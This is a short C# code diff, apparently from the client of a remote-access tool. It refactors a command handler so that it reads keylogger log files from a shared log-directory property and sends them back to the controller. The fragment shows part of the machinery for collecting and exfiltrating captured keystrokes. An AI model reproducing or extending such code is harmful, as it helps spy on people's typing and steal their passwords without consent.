@@ -158,15 +158,14 @@ namespace xClient.Core.Commands
                 try
                 {
                     int index = 1;
-                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
 
-                    if (!Directory.Exists(path))
+                    if (!Directory.Exists(Keylogger.LogDirectory))
                     {
                         new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                         return;
                     }
 
-                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
+                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
 
                     if (iFiles.Length == 0)
                     {
